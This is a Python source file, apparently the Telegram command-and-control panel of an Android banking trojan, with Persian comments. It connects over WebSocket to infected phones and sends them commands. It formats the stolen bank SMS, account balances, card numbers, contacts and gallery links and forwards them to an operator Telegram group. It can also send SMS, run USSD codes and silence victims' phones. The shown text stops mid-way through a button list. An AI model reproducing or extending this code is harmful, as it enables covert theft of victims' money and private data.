# bot.py
# ============================================================
# ربات تلگرام متصل به سرور WebSocket (api.py)
# سازگار با معماری Real-time (بدون دیتابیس برای دستورات و نتایج)
# ============================================================
import telebot
import json
import logging
import time
import threading
import re
import tempfile
import os
import asyncio
import websockets
from telebot.apihelper import ApiTelegramException
from config import BOT_TOKEN, WEBSOCKET_URL, GROUP_CHAT_ID
from collections import deque

# ============================================================
# تنظیم لاگ
# ============================================================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)
bot = telebot.TeleBot(BOT_TOKEN)

# ============================================================
# داده‌های موقت و متغیرهای سراسری
# ============================================================
temp_data = {}
EXPIRE_TIME = 600
COMMAND_RETRY_LIMIT = 20
GALLERY_RETRY_LIMIT = 200

pending_notifications_cache = deque(maxlen=200)
is_processing_notification = False

# کش محلی برای مشخصات استاتیک دستگاه‌ها جهت حذف رقابت همزمانی (Race Condition) و سرعت فوق‌العاده
device_cache = {}

# کش برای نتایج موقت (در صورت نیاز)
pending_results = {}

# ============================================================
# توابع مدیریت داده‌های موقت
# ============================================================
def clean_expired_temp_data():
    now = time.time()
    keys_to_remove = []
    for key, value in list(temp_data.items()):
        if isinstance(value, dict) and 'timestamp' in value:
            if now - value['timestamp'] > EXPIRE_TIME:
                keys_to_remove.append(key)
        else:
            keys_to_remove.append(key)
    for key in keys_to_remove:
        try:
            del temp_data[key]
            logger.info(f"🗑️ Temp data expired and removed: {key}")
        except KeyError:
            pass

def start_cleanup_thread():
    def cleanup_loop():
        while True:
            time.sleep(60)
            clean_expired_temp_data()
    thread = threading.Thread(target=cleanup_loop, daemon=True)
    thread.start()
    return thread

def touch_temp_data(key):
    if key in temp_data and isinstance(temp_data[key], dict):
        temp_data[key]['timestamp'] = time.time()

def set_temp_data(key, data):
    temp_data[key] = {
        'data': data,
        'timestamp': time.time()
    }

def get_temp_data(key):
    if key in temp_data:
        touch_temp_data(key)
        return temp_data[key]['data']
    return None

def delete_temp_data(key):
    if key in temp_data:
        try:
            del temp_data[key]
        except KeyError:
            pass

# ============================================================
# کلاینت WebSocket (ارسال و دریافت تمام پیام‌ها)
# ============================================================
class WebSocketClient:
    def __init__(self, uri):
        self.uri = uri
        self.websocket = None
        self.loop = asyncio.new_event_loop()
        self.pending_requests = {}
        self.is_connected = False
        self.should_reconnect = True
        self.reconnect_delay = 3
        self.max_reconnect_delay = 30
        self.ping_interval = 20
        self.ping_timeout = 30
        self._stop_event = threading.Event()

    def start(self):
        asyncio.set_event_loop(self.loop)
        self.loop.run_until_complete(self._run())

    def stop(self):
        self.should_reconnect = False
        self._stop_event.set()
        if self.websocket:
            asyncio.run_coroutine_threadsafe(
                self.websocket.close(),
                self.loop
            )

    async def _run(self):
        while self.should_reconnect:
            try:
                async with websockets.connect(
                    self.uri,
                    ping_interval=self.ping_interval,
                    ping_timeout=self.ping_timeout,
                    close_timeout=10,
                    max_size=2**20
                ) as websocket:
                    self.websocket = websocket
                    self.is_connected = True
                    self.reconnect_delay = 3
                    logger.info("✅ Connected to WebSocket server")
                    await self._listen()
            except websockets.exceptions.ConnectionClosed as e:
                logger.warning(f"WebSocket connection closed: {e}. Reconnecting...")
                self.is_connected = False
                await self._reconnect()
            except Exception as e:
                logger.error(f"WebSocket connection error: {e}. Reconnecting...")
                self.is_connected = False
                await self._reconnect()

    async def _reconnect(self):
        if not self.should_reconnect:
            return
        delay = min(self.reconnect_delay, self.max_reconnect_delay)
        logger.info(f"🔄 Reconnecting in {delay}s...")
        await asyncio.sleep(delay)
        self.reconnect_delay = min(self.reconnect_delay * 1.5, self.max_reconnect_delay)

    async def _listen(self):
        try:
            async for message in self.websocket:
                try:
                    data = json.loads(message)
                    msg_type = data.get('type')
                    logger.info(f"📥 Received WebSocket message: {msg_type}")
                    
                    if msg_type == 'result':
                        command_id = data.get('command_id')
                        result_data = data.get('data')
                        set_code = data.get('set_code')
                        
                        # بررسی اینکه آیا شناسه دستور در دایرکتوری‌های معلق ربات هست
                        # هم به صورت عدد (که از پایتون تولید شده) هم رشته
                        found_target = False
                        for cid in list(self.pending_requests.keys()):
                            if str(cid) == str(command_id):
                                self.pending_requests[cid]['result'] = result_data
                                self.pending_requests[cid]['received'] = True
                                found_target = True
                                break
                                
                        if not_found_target := not found_target:
                            # نتیجه خودکار - ارسال به گروه
                            inferred_type = infer_command_type(result_data)
                            threading.Thread(
                                target=send_result_to_group,
                                args=(inferred_type or "UNKNOWN", command_id, set_code, result_data),
                                daemon=True
                            ).start()
                            
                    elif msg_type == 'notification':
                        notif_data = data.get('data')
                        if notif_data:
                            pending_notifications_cache.append(notif_data)
                            threading.Thread(
                                target=process_pending_notifications,
                                daemon=True
                            ).start()
                            
                    elif msg_type == 'device_info':
                        set_code = data.get('set_code')
                        device = data.get('device')
                        if set_code in self.pending_requests:
                            self.pending_requests[set_code]['device'] = device
                            self.pending_requests[set_code]['received'] = True
                            
                    elif msg_type == 'online_devices':
                        devices = data.get('devices', [])
                        if 'online_devices' in self.pending_requests:
                            self.pending_requests['online_devices']['devices'] = devices
                            self.pending_requests['online_devices']['received'] = True
                            
                    elif msg_type == 'stats':
                        stats = data.get('stats', {})
                        if 'stats' in self.pending_requests:
                            self.pending_requests['stats']['data'] = stats
                            self.pending_requests['stats']['received'] = True
                            
                    elif msg_type == 'success':
                        action = data.get('action')
                        command_id = data.get('command_id')
                        set_code = data.get('set_code')
                        
                        # پیدا کردن target_id مناسب
                        target_id = None
                        if command_id and command_id in self.pending_requests:
                            target_id = command_id
                        elif set_code and set_code in self.pending_requests:
                            target_id = set_code
                        elif action and action in self.pending_requests:
                            target_id = action
                            
                        if target_id:
                            self.pending_requests[target_id]['success'] = True
                            for key, val in data.items():
                                if key not in ['type', 'action']:
                                    self.pending_requests[target_id][key] = val
                            self.pending_requests[target_id]['received'] = True
                        else:
                            # اگر هیچ target_idی پیدا نشد، یک درخواست مجازی ایجاد کن
                            req_id = command_id or set_code or action or str(int(time.time()*1000))
                            self.pending_requests[req_id] = {
                                'success': True,
                                'command_id': command_id,
                                'set_code': set_code,
                                'action': action,
                                'received': True
                            }
                            
                    elif msg_type == 'error':
                        error_msg = data.get('message', 'Unknown error')
                        action = data.get('action')
                        command_id = data.get('command_id')
                        set_code = data.get('set_code')
                        
                        target_id = None
                        if command_id and command_id in self.pending_requests:
                            target_id = command_id
                        elif set_code and set_code in self.pending_requests:
                            target_id = set_code
                        elif action and action in self.pending_requests:
                            target_id = action
                            
                        if target_id:
                            self.pending_requests[target_id]['error'] = error_msg
                            self.pending_requests[target_id]['received'] = True
                        else:
                            # اگر هیچ target_idی پیدا نشد، یک درخواست مجازی ایجاد کن با خطا
                            req_id = command_id or set_code or action or str(int(time.time()*1000))
                            self.pending_requests[req_id] = {
                                'error': error_msg,
                                'received': True
                            }
                            
                    elif msg_type == 'all_devices':
                        devices = data.get('devices', [])
                        if 'all_devices' in self.pending_requests:
                            self.pending_requests['all_devices']['devices'] = devices
                            self.pending_requests['all_devices']['received'] = True
                            
                    else:
                        logger.warning(f"Unknown message type: {msg_type}")
                        
                except json.JSONDecodeError:
                    logger.error(f"Invalid JSON received: {message[:200]}")
                except Exception as e:
                    logger.error(f"Error processing message: {e}")
        except websockets.exceptions.ConnectionClosed:
            raise
        except Exception as e:
            logger.error(f"Listen loop error: {e}")
            raise

    async def send_request(self, request_type, timeout=35, **kwargs):
        if not self.is_connected:
            logger.warning("WebSocket not connected. Trying to reconnect...")
            await asyncio.sleep(2)
            return {'error': 'not_connected'}
            
        if 'set_code' in kwargs:
            request_id = kwargs['set_code']
        elif 'command_id' in kwargs:
            request_id = kwargs['command_id']
        else:
            request_id = request_type
            
        self.pending_requests[request_id] = {'received': False}
        
        try:
            await self.websocket.send(json.dumps({
                'type': request_type,
                **kwargs
            }))
            logger.info(f"📤 Sent {request_type} request: {kwargs}")
            
            start = time.time()
            while not self.pending_requests[request_id]['received']:
                if time.time() - start > timeout:
                    logger.warning(f"Timeout for {request_type} after {timeout}s")
                    if request_id in self.pending_requests:
                        try:
                            del self.pending_requests[request_id]
                        except KeyError:
                            pass
                    return {'error': 'timeout'}
                await asyncio.sleep(0.1)
                
            # دریافت ایمن دیتا در زمان رقابت همزمانی
            response = self.pending_requests.get(request_id, {'error': 'overwritten_or_deleted'})
            if request_id in self.pending_requests:
                try:
                    del self.pending_requests[request_id]
                except KeyError:
                    pass
            return response
            
        except Exception as e:
            logger.error(f"Error sending request: {e}")
            if request_id in self.pending_requests:
                try:
                    del self.pending_requests[request_id]
                except KeyError:
                    pass
            return {'error': str(e)}

    def send_sync(self, request_type, timeout=35, **kwargs):
        if self.loop.is_running():
            future = asyncio.run_coroutine_threadsafe(
                self.send_request(request_type, timeout, **kwargs),
                self.loop
            )
            return future.result()
        else:
            return asyncio.run_coroutine_threadsafe(
                self.send_request(request_type, timeout, **kwargs),
                self.loop
            ).result()

    def send_async(self, request_type, **kwargs):
        if self.is_connected:
            asyncio.run_coroutine_threadsafe(
                self.websocket.send(json.dumps({'type': request_type, **kwargs})),
                self.loop
            )
        else:
            logger.warning("WebSocket not connected, cannot send async request")

# ============================================================
# نمونه کلاینت WebSocket
# ============================================================
ws_client = WebSocketClient(WEBSOCKET_URL)

# ============================================================
# شروع WebSocket در thread جداگانه
# ============================================================
def start_websocket():
    ws_client.start()
websocket_thread = threading.Thread(target=start_websocket, daemon=True)
websocket_thread.start()

# ============================================================
# پردازش نوتیفیکیشن‌های معلق
# ============================================================
def process_pending_notifications():
    global is_processing_notification
    if is_processing_notification:
        return
    is_processing_notification = True
    try:
        while pending_notifications_cache:
            notif = pending_notifications_cache.popleft()
            send_notification_to_group(notif)
            time.sleep(1)
    except Exception as e:
        logger.error(f"Error processing pending notifications: {e}")
    finally:
        is_processing_notification = False

# ============================================================
# توابع کمکی برای ارسال درخواست‌ها
# ============================================================
def get_device_info(set_code, bypass_cache=False):
    if not set_code:
        return None
    # ★ Pry-بررسی کش محلی در لحظه اول برای حذف درخواست‌های مکرر همزمان و افزایش بازدهی رم
    if not bypass_cache and set_code in device_cache:
        return device_cache[set_code]
        
    response = ws_client.send_sync('get_device', timeout=35, set_code=set_code)
    if response.get('error'):
        logger.error(f"Error getting device info: {response}")
        return device_cache.get(set_code) # بازگشت به مقدار کش در صورت خطا
        
    device = response.get('device')
    if device:
        device_cache[set_code] = device # ذخیره در کش
    return device

def get_online_devices():
    response = ws_client.send_sync('online_devices', timeout=35)
    if response.get('error'):
        logger.error(f"Error getting online devices: {response}")
        return []
    return response.get('devices', [])

def get_all_devices():
    response = ws_client.send_sync('all_devices', timeout=35)
    if response.get('error'):
        logger.error(f"Error getting all devices: {response}")
        return []
    return response.get('devices', [])

def get_stats():
    response = ws_client.send_sync('stats', timeout=35)
    if response.get('error'):
        logger.error(f"Error getting stats: {response}")
        return {'total_users': 0, 'online_users': 0, 'offline_users': 0}
    return response.get('data', {'total_users': 0, 'online_users': 0, 'offline_users': 0})

def add_command(set_code, command_type, params=None, command_id=None):
    if not set_code or not command_type:
        return None
    if command_id is None:
        command_id = int(time.time() * 1000)
    response = ws_client.send_sync('add_command', timeout=60, set_code=set_code, command_type=command_type, params=params or {}, command_id=command_id)
    if response.get('error'):
        logger.error(f"Error adding command: {response}")
        return None
    return response.get('command_id')

def update_nickname(set_code, nickname):
    if not set_code:
        return False
    response = ws_client.send_sync('update_nickname', timeout=35, set_code=set_code, nickname=nickname)
    success = response.get('success', False)
    if success:
        # آپدیت آنی کش محلی
        if set_code in device_cache:
            device_cache[set_code]['nickname'] = nickname
    return success

# ★ Pry-deprecated methods keeping for backward compatibility
def get_result(command_id):
    logger.warning("get_result is deprecated in new real-time architecture")
    return None

def delete_command(command_id):
    logger.warning("delete_command is deprecated in new real-time architecture")
    return False

def delete_notification(notification_id):
    removed = False
    for n in list(pending_notifications_cache):
        if n.get('id') == notification_id or n.get('data', {}).get('id') == notification_id:
            try:
                pending_notifications_cache.remove(n)
                removed = True
            except ValueError:
                pass
    return removed

def register_device(device_data):
    response = ws_client.send_sync('register', timeout=35, data=device_data)
    if response.get('error'):
        return None
    return response.get('set_code')

# ============================================================
# توابع کمکی (فرمت‌دهی، escape، و...)
# ============================================================
def escape_html(text):
    if not text:
        return ""
    return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

def get_display_name(set_code):
    if not set_code:
        return 'Unknown'
    device = get_device_info(set_code)
    if device:
        return device.get('nickname') or device.get('device_name') or set_code
    return set_code

def get_sim_info_map(set_code):
    device = get_device_info(set_code)
    if not device:
        return {}
    sim_info_list = device.get('sim_info', [])
    sim_map = {}
    if isinstance(sim_info_list, list):
        for sim in sim_info_list:
            try:
                slot = int(sim.get('sim_slot', -1))
            except (ValueError, TypeError):
                slot = -1
            operator = sim.get('operator', f"SIM {slot+1}")
            if slot >= 0:
                sim_map[slot] = escape_html(operator)
    return sim_map

def get_sim_label(sim_slot, sim_map):
    try:
        sim_slot = int(sim_slot)
    except (ValueError, TypeError):
        return "❓ ناشناس"
    if sim_slot < 0:
        return "❓ ناشناس"
    operator = sim_map.get(sim_slot, f"SIM {sim_slot+1}")
    return f"SIM {sim_slot+1} ({operator})"

# ============================================================
# توابع تشخیص نوع نتیجه از روی محتوا
# ============================================================
def infer_command_type(result_data):
    if not isinstance(result_data, dict):
        return None
    if "status" in result_data:
        status_str = str(result_data.get("status", "")).lower()
        if status_str == "pong":
            return "PING"
        if "silent" in status_str:
            return "SILENT_MODE"
        if "normal" in status_str:
            return "NORMAL_MODE"
    if "last_sms" in result_data:
        return "GET_LAST_SMS"
    if "numbers" in result_data:
        return "GET_USER_NUMBER"
    if "balances" in result_data:
        return "GET_BALANCES"
    if "cards" in result_data:
        return "GET_CARDS"
    if "ussd_code" in result_data or "response" in result_data:
        return "GET_USSD"
    if "sent_to" in result_data:
        return "SEND_SMS"
    if "battery_percentage" in result_data:
        return "GET_BATTERY"
    if "urls" in result_data:
        return "GET_GALLERY"
    if "file_url" in result_data:
        return "GET_ALL_SMS"
    if "banks" in result_data:
        return "GET_ALL_BANK_SMS"
    if "apps" in result_data:
        return "GET_INSTALLED_APPS"
    if "contacts" in result_data:
        return "GET_CONTACTS"
    if "sms" in result_data:
        return "GET_SMS_BY_NUMBER"
    return None

# ============================================================
# توابع ارسال فایل
# ============================================================
def send_as_file(chat_id, content, filename, caption, set_code=None):
    try:
        with tempfile.NamedTemporaryFile(mode='w+', suffix='.txt', delete=False, encoding='utf-8') as tmp_file:
            tmp_file.write(content)
            tmp_file_path = tmp_file.name
        with open(tmp_file_path, 'rb') as f:
            if set_code:
                caption += f"\n\n🔑 /{set_code}"
            bot.send_document(chat_id, f, caption=caption, parse_mode='HTML')
        try:
            os.remove(tmp_file_path)
        except:
            pass
        logger.info(f"✅ File sent: {filename} ({len(content)} chars)")
        return True
    except Exception as e:
        logger.error(f"❌ Error sending file: {e}")
        return False

def generate_sms_file_content(sms_list, device_name, title="ALL SMS"):
    lines = []
    lines.append(f"📨 {title}")
    lines.append(f"📱 Device: {device_name}")
    lines.append(f"📊 Total: {len(sms_list)}")
    lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    lines.append("")
    for i, sms in enumerate(sms_list, 1):
        address = sms.get("address", "نامشخص")
        body = sms.get("body", "متن پیام خالی است")
        msg_type = sms.get("type", "UNKNOWN")
        type_label = "Inbox" if msg_type == "INBOX" else "Sent" if msg_type == "SENT" else "Unknown"
        sim_slot = sms.get("sim_slot", -1)
        sim_label = f"SIM {sim_slot+1}" if sim_slot >= 0 else "Unknown"
        date = sms.get("date", 0)
        lines.append(f"{i}. 📞 {address} ({type_label}) [SIM: {sim_label}]")
        lines.append(f"   📅 {date}")
        lines.append(f"   💬 {body}")
        lines.append("")
    return "\n".join(lines)

def generate_contacts_file_content(contacts, device_name):
    lines = []
    lines.append(f"📞 CONTACTS")
    lines.append(f"📱 Device: {device_name}")
    lines.append(f"📊 Total: {len(contacts)}")
    lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    lines.append("")
    for i, contact in enumerate(contacts, 1):
        name = contact.get("name", "بدون نام")
        number = contact.get("number", "")
        lines.append(f"{i}. 👤 {name} → 📞 {number}")
    return "\n".join(lines)

def generate_apps_file_content(apps):
    lines = []
    for app in apps:
        name = app.get("name", "نامشخص")
        lines.append(name)
    return "\n".join(lines)

# ============================================================
# قالب‌بندی نتایج
# ============================================================
def format_result(command_type, result_data, device_name, set_code):
    sim_map = get_sim_info_map(set_code)
    if not result_data:
        return "❌ نتیجه‌ای دریافت نشد."
        
    # ★ Pry-قالب‌بندی PING با محاسبه دقیق تاخیر زمانی رفت و برگشت
    if command_type == "PING":
        send_time = result_data.get('send_time', 0)
        receive_time = result_data.get('receive_time', 0)
        if send_time and receive_time:
            ping_ms = int((receive_time - send_time) * 1000)
        else:
            ping_ms = 0
            
        msg = f"<b>⚡️ PING RESULT</b>\n"
        msg += f"📱 Device: <code>{escape_html(device_name)}</code>\n"
        
        # نمایش وضعیت موفقیت و تاخیر پینگ میلی ثانیه در یک خط
        success_val = result_data.get('success', True) or result_data.get('status') == 'pong'
        status_icon = "🟢 Success" if success_val else "🔴 Failed"
        msg += f"📈 Status: <code>{status_icon}</code> (ping {ping_ms} ms)\n"
        
        msg += f"🕒 Sent: <code>{time.strftime('%H:%M:%S', time.localtime(send_time)) if send_time else 'N/A'}</code>\n"
        msg += f"🕒 Received: <code>{time.strftime('%H:%M:%S', time.localtime(receive_time)) if receive_time else 'N/A'}</code>"
        return msg
        
    if command_type == "GET_LAST_SMS":
        last = result_data.get("last_sms", {})
        address = escape_html(last.get("address", "نامشخص"))
        body = last.get("body", "متن پیام خالی است")
        sim_slot = last.get("sim_slot", -1)
        sim_label = get_sim_label(sim_slot, sim_map)
        msg = f"<b>📨 LAST SMS</b>\n"
        msg += f"📱 Device: <code>{escape_html(device_name)}</code>\n"
        msg += f"📞 Phone: <code>{address}</code>\n"
        msg += f"📶 SIM: <code>{sim_label}</code>\n"
        msg += f"━━━━━━━━━━━━━━━\n"
        msg += f"💬 Message:\n<pre>{body}</pre>"
        return msg
        
    if command_type == "GET_USER_NUMBER":
        numbers = result_data.get("numbers", [])
        count = result_data.get("count", 0)
        msg = f"<b>📇 USER NUMBERS</b>\n"
        msg += f"📱 Device: <code>{escape_html(device_name)}</code>\n"
        msg += f"📊 Found: <code>{count}</code>\n━━━━━━━━━━━━━━━\n"
        if count > 0:
            for num in numbers:
                phone = escape_html(num.get("phone_number", "نامشخص"))
                operator = escape_html(num.get("operator", "نامشخص"))
                msg += f"📞 <code>{phone}</code> ({operator})\n"
        else:
            msg += "❌ شماره‌ای یافت نشد."
        return msg
        
    if command_type == "GET_BALANCES":
        balances = result_data.get("balances", [])
        count = result_data.get("count", 0)
        msg = f"<b>💰 BALANCES</b>\n"
        msg += f"📱 Device: <code>{escape_html(device_name)}</code>\n"
        msg += f"📊 Count: <code>{count}</code>\n━━━━━━━━━━━━━━━\n"
        if count > 0:
            for b in balances:
                bank = escape_html(b.get("bank_name", "نامشخص"))
                amount = b.get("amount", 0)
                sender = escape_html(b.get("sender", "نامشخص"))
                raw = b.get("raw_message", "")
                
                try:
                    if isinstance(amount, str):
                        amount = amount.replace(",", "")
                    amount_formatted = f"{int(float(amount)):,}"
                except Exception:
                    amount_formatted = str(amount)
                    
                msg += f"🏦 {bank}\n   💰 {amount_formatted} ریال\n   📞 {sender}\n"
                if raw:
                    msg += f"   📝 متن: {escape_html(raw)}\n"
                msg += "\n"
        else:
            msg += "❌ هیچ موجودی یافت نشد."
        return msg
        
    if command_type == "GET_CARDS":
        cards = result_data.get("cards", [])
        count = result_data.get("count", 0)
        msg = f"<b>💳 CARD NUMBERS</b>\n"
        msg += f"📱 Device: <code>{escape_html(device_name)}</code>\n"
        msg += f"📊 Count: <code>{count}</code>\n━━━━━━━━━━━━━━━\n"
        if count > 0:
            for c in cards:
                card = escape_html(c.get("card_number", "نامشخص"))
                bank = escape_html(c.get("bank", "نامشخص"))
                msg += f"💳 <code>{card}</code>\n   🏦 {bank}\n\n"
        else:
            msg += "❌ هیچ شماره کارتی یافت نشد."
        return msg
        
    if command_type == "GET_USSD":
        response = result_data.get("response", "پاسخی دریافت نشد")
        code = escape_html(result_data.get("ussd_code", "نامشخص"))
        sim_slot = result_data.get("sim_slot", -1)
        sim_label = get_sim_label(sim_slot, sim_map)
        msg = f"<b>📟 USSD RESULT</b>\n"
        msg += f"📱 Device: <code>{escape_html(device_name)}</code>\n"
        msg += f"📶 SIM: <code>{sim_label}</code>\n"
        msg += f"🔢 Code: <code>{code}</code>\n━━━━━━━━━━━━━━━\n"
        msg += f"💬 Response:\n<pre>{response}</pre>"
        return msg
        
    if command_type == "SEND_SMS":
        sent_to = escape_html(result_data.get("sent_to", "نامشخص"))
        message = escape_html(result_data.get("message", "متن پیام خالی است"))
        sim_slot = result_data.get("sim_slot", -1)
        sim_label = get_sim_label(sim_slot, sim_map)
        msg = f"<b>📨 SMS SENT</b>\n"
        msg += f"📱 Device: <code>{escape_html(device_name)}</code>\n"
        msg += f"📞 To: <code>{sent_to}</code>\n"
        msg += f"📶 SIM: <code>{sim_label}</code>\n━━━━━━━━━━━━━━━\n"
        msg += f"💬 Message:\n<pre>{message}</pre>"
        return msg
        
    if command_type in ["SILENT_MODE", "NORMAL_MODE"]:
        status = result_data.get("status", "نامشخص")
        mode = "🔇 Silent" if command_type == "SILENT_MODE" else "🔊 Normal"
        msg = f"{mode} <b>{command_type}</b>\n"
        msg += f"📱 Device: <code>{escape_html(device_name)}</code>\n"
        msg += f"📊 Status: <code>{status}</code>\n"
        msg += f"💬 {escape_html(result_data.get('message', ''))}"
        return msg
        
    if command_type == "GET_BATTERY":
        battery = result_data.get("battery_percentage", 0)
        charging = result_data.get("is_charging", False)
        status = "🔋 در حال شارژ" if charging else "⚡ استفاده از باتری"
        msg = f"<b>🔋 BATTERY STATUS</b>\n"
        msg += f"📱 Device: <code>{escape_html(device_name)}</code>\n"
        msg += f"📊 Level: <code>{battery}%</code>\n"
        msg += f"📊 Status: {status}"
        return msg

    # ★ Pry-قالب‌بندی کاملاً عمومی و شکیل برای سایر دستورات فرعی یا جدید (بدون فرستادن جیسون خام)
    msg = f"<b>📊 {command_type} RESULT</b>\n"
    msg += f"📱 Device: <code>{escape_html(device_name)}</code>\n"
    msg += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    success_status = result_data.get('success', True) or result_data.get('status') == 'success'
    msg += f"📈 Status: <code>{'🟢 Success' if success_status else '🔴 Failed'}</code>\n"
    
    has_data_keys = False
    for k, v in result_data.items():
        if k not in ['type', 'command_id', 'set_code', 'success', 'status', 'send_time', 'receive_time']:
            has_data_keys = True
            clean_key = k.replace('_', ' ').capitalize()
            msg += f"🔹 {escape_html(clean_key)}: <code>{escape_html(v)}</code>\n"
            
    if not has_data_keys and 'message' in result_data:
        msg += f"💬 Message: <code>{escape_html(result_data.get('message', ''))}</code>\n"
        
    return msg

# ============================================================
# قالب‌بندی نوتیفیکیشن‌ها
# ============================================================
def format_app_install_notification(data, device_name, set_code):
    app_name = escape_html(data.get("app_name", "نامشخص"))
    package_name = escape_html(data.get("package_name", "نامشخص"))
    android_version = escape_html(data.get("android_version", "نامشخص"))
    battery = data.get("battery", "N/A")
    permissions = data.get("granted_permissions", [])
    
    msg = f"<b>📲 نصب برنامه جدید</b>\n"
    msg += f"📱 Device: <code>{escape_html(device_name)}</code>\n"
    msg += f"📌 App: <code>{app_name}</code>\n"
    msg += f"📦 Package: <code>{package_name}</code>\n"
    msg += f"🤖 Android: <code>{android_version}</code>\n"
    msg += f"🔋 Battery: <code>{battery}%</code>\n"
    if permissions:
        msg += f"🔐 Permissions: {', '.join([escape_html(p) for p in permissions])}\n"
    
    balance_data = data.get("balance")
    if balance_data and isinstance(balance_data, dict):
        if balance_data.get("message"):
            msg += f"\n💰 {escape_html(balance_data.get('message'))}\n"
        else:
            balance_count = balance_data.get("count", 0)
            balances = balance_data.get("balances", [])
            if balance_count > 0 and balances:
                msg += f"\n<b>💰 موجودی حساب‌ها:</b>\n"
                for b in balances:
                    bank = escape_html(b.get("bank_name", "نامشخص"))
                    amount_val = b.get("amount", 0)
                    try:
                        if isinstance(amount_val, str):
                            amount_val = amount_val.replace(",", "")
                        amount_formatted = f"{int(float(amount_val)):,}"
                    except Exception:
                        amount_formatted = str(amount_val)
                    msg += f"  • {bank}: {amount_formatted} ریال\n"
            else:
                msg += f"\n💰 کاربر دسترسی SMS نداده است\n"
    else:
        msg += f"\n💰 کاربر دسترسی SMS نداده است\n"
    
    return msg

def format_new_sms_notification(data, device_name, set_code):
    sim_map = get_sim_info_map(set_code)
    address = escape_html(data.get("address", "نامشخص"))
    body = escape_html(data.get("body", "متن پیام خالی است"))
    try:
        sim_slot = int(data.get("sim_slot", -1))
    except (ValueError, TypeError):
        sim_slot = -1
    sim_label = get_sim_label(sim_slot, sim_map)
    msg = f"<b>📨 NEW SMS</b>\n"
    msg += f"📱 Device: <code>{escape_html(device_name)}</code>\n"
    msg += f"📞 From: <code>{address}</code>\n"
    msg += f"📶 SIM: <code>{sim_label}</code>\n"
    msg += f"━━━━━━━━━━━━━━━\n"
    msg += f"💬 Message:\n<pre>{body}</pre>"
    return msg

def format_bank_sms_result(raw_result, display_name, set_code):
    try:
        banks = raw_result.get("banks", [])
        total = raw_result.get("total_banks", len(banks))
        if not banks:
            return f"<b>🏦 BANK SMS</b>\n📱 Device: <code>{escape_html(display_name)}</code>\n❌ هیچ پیامکی از بانک‌ها یافت نشد."
        if total > 15:
            lines = []
            lines.append(f"🏦 BANK SMS (Total: {total})")
            lines.append(f"📱 Device: {display_name}")
            lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            for idx, bank in enumerate(banks, 1):
                bank_name = bank.get("bank_name", "نامشخص")
                sender = bank.get("sender_number", "نامشخص")
                latest = bank.get("latest_message", {})
                msg = latest.get("message", "")
                date = latest.get("formatted_time", "نامشخص")
                sim = latest.get("sim_info", "نامشخص")
                lines.append(f"{idx}. 🏦 {bank_name}")
                lines.append(f"   📞 فرستنده: {sender}")
                lines.append(f"   🕒 تاریخ: {date}")
                lines.append(f"   📶 سیم‌کارت: {sim}")
                lines.append(f"   💬 متن: {msg}")
                lines.append("")
            content = "\n".join(lines)
            filename = f"bank_sms_{set_code}.txt"
            caption = f"🏦 BANK SMS\n📱 Device: {display_name}\n📊 Total: {total}"
            send_as_file(GROUP_CHAT_ID, content, filename, caption, set_code)
            return None
        msg = f"<b>🏦 BANK SMS</b>\n"
        msg += f"📱 Device: <code>{escape_html(display_name)}</code>\n"
        msg += f"📊 Total: <code>{total}</code>\n"
        msg += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        for bank in banks:
            bank_name = escape_html(bank.get("bank_name", "نامشخص"))
            sender = escape_html(bank.get("sender_number", "نامشخص"))
            latest = bank.get("latest_message", {})
            body = escape_html(latest.get("message", ""))
            date = escape_html(latest.get("formatted_time", "نامشخص"))
            sim = escape_html(latest.get("sim_info", "نامشخص"))
            msg += f"🏦 <b>{bank_name}</b>\n"
            msg += f"   📞 فرستنده: <code>{sender}</code>\n"
            msg += f"   🕒 تاریخ: <code>{date}</code>\n"
            msg += f"   📶 سیم‌کارت: <code>{sim}</code>\n"
            msg += f"   💬 متن:\n<pre>{body}</pre>\n\n"
        if set_code:
            msg += f"\n🔑 /{set_code}"
        return msg
    except Exception as e:
        logger.error(f"Error formatting bank SMS: {e}")
        return None

# ============================================================
# ارسال نوتیفیکیشن به گروه
# ============================================================
def send_notification_to_group(notification):
    try:
        notif_id = notification.get('id')
        notif_type = notification.get('type')
        notif_data = notification.get('data', {})
        set_code = notification.get('set_code')
        logger.info(f"📨 Processing notification ID {notif_id}, type: {notif_type}")
        device_name = get_display_name(set_code) if set_code else "Unknown"
        if notif_type == "app_install":
            message = format_app_install_notification(notif_data, device_name, set_code)
        elif notif_type == "new_sms":
            message = format_new_sms_notification(notif_data, device_name, set_code)
        else:
            raw_message = (
                notification.get('message') or 
                (notification.get('data') if isinstance(notification.get('data'), str) else None) or 
                (notification.get('data', {}).get('message') if isinstance(notification.get('data'), dict) else None) or 
                '📢 New notification'
            )
            if "Device:" not in raw_message and device_name:
                raw_message = f"<b>📢 New Notification</b>\n📱 Device: <code>{escape_html(device_name)}</code>\n" + raw_message
            message = raw_message
        if set_code:
            message += f"\n\n🔑 /{set_code}"
        bot.send_message(GROUP_CHAT_ID, message, parse_mode='HTML')
        logger.info(f"✅ Notification {notif_id} sent to group.")
        return True
    except Exception as e:
        logger.error(f"❌ Failed to send notification: {e}")
        return False

# ============================================================
# صفحه‌کلیدها
# ============================================================
def main_menu_keyboard():
    keyboard = telebot.types.InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        telebot.types.InlineKeyboardButton("📱 Online Users", callback_data="online_users"),
        telebot.types.InlineKeyboardButton("📤 Request All", callback_data="request_all")
    )
    return keyboard

def device_panel_keyboard(set_code):
    keyboard = telebot.types.InlineKeyboardMarkup(row_width=2)
    buttons = [
        telebot.types.InlineKeyboardButton("⚡ Ping", callback_data=f"cmd_{set_code}_PING"),
        telebot.types.InlineKeyboardButton("📞 Contacts", callback_data=f"cmd_{set_code}_GET_CONTACTS"),
        telebot.types.InlineKeyboardButton("🏦 All Bank SMS", callback_data=f"cmd_{set_code}_GET_ALL_BANK_SMS"),
        telebot.types.InlineKeyboardButton("📨 Send SMS", callback_data=f"cmd_{set_code}_SEND_SMS"),
        telebot.types.InlineKeyboardButton("📁 Gallery", callback_data=f"cmd_{set_code}_GET_GALLERY"),
